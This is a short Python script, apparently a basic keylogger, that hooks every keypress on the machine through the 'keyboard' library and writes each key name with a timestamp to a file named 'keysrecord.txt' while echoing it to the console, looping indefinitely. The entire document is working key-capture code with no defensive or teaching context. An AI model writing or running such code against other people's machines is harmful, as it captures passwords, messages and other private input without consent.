import keyboard
import logging

# Create a logger
logger = logging.getLogger(__name__)

# Set the level of the logger. This can be DEBUG, INFO, WARNING, ERROR, CRITICAL.
logger.setLevel(logging.DEBUG)

# Create a file handler
handler = logging.FileHandler('keysrecord.txt')

# Create a formatter and add it to the handler
formatter = logging.Formatter('%(asctime)s - %(message)s')
handler.setFormatter(formatter)

# Add the handler to the logger
logger.addHandler(handler)

def log_keypress(e):
 print(str(e.name))
 logger.info(str(e.name))

keyboard.hook(log_keypress)

while True:
 pass